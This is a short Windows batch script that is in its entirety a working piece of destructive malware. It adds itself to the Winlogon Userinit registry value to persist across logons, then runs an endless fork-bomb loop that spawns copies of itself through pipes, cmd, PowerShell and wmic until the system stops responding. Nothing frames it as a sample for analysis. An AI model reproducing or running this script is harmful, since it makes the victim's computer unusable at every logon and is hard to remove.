@echo off

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,%~f0" /f 

:loop
%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|

start cmd /c "%0"

start powershell -Command "while(1){Start-Process cmd.exe}"

wmic process call create "cmd.exe /c %0"
goto loop
